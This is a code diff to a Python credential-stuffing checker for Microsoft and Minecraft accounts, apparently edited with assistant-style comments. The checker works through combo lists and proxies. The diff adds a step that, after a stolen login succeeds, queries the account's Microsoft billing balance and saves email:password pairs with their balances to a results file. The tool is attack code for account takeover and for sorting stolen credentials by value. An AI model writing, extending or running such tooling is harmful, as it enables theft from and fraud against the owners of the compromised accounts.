@@ -28,7 +28,7 @@ Combos = []
 proxylist = []
 banproxies = []
 fname = ""
-hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other,balance = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
@@ -375,10 +375,23 @@ def capture_mc(access_token, session, email, password, type):
             continue
 
 def checkmc(session, email, password, token):
-    global retries, bedrock, cpm, checked, xgp, xgpu, other
+    global retries, bedrock, cpm, checked, xgp, xgpu, other, balance  # Add balance to globals
     while True:
         checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
         if checkrq.status_code == 200:
+            # Check Microsoft balance
+            try:
+                balancerq = session.get('https://account.microsoft.com/billing/payments', headers={'Authorization': f'Bearer {token}'}, verify=False)
+                if balancerq.status_code == 200:
+                    if 'availableBalance' in balancerq.text:
+                        balance_amount = re.search(r'"availableBalance":\s*"([^"]+)"', balancerq.text)
+                        if balance_amount:
+                            if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Balance Found: {email}:{password} | Balance: {balance_amount.group(1)}")
+                            with open(f"results/{fname}/balanced.txt", 'a') as f:
+                                f.write(f"{email}:{password} | Balance: {balance_amount.group(1)}\n")
+            except: pass
+
+            # Rest of your existing checks
             if 'product_game_pass_ultimate' in checkrq.text:
                 xgpu+=1
                 cpm+=1
@@ -390,6 +403,7 @@ def checkmc(session, email, password, token):
                     CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                     CAPTURE.handle()
                 return True
+            # ... rest of your existing code ...
             elif 'product_game_pass_pc' in checkrq.text:
                 xgp+=1
                 cpm+=1
@@ -530,7 +544,7 @@ def logscreen():
     global cpm, cpm1
     cmp1 = cpm
     cpm = 0
-    utils.set_title(f"Modified By 8H3 | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
+    utils.set_title(f"Modified By 8H3 | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Balance: {balance}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
     time.sleep(1)
     threading.Thread(target=logscreen).start()    
 
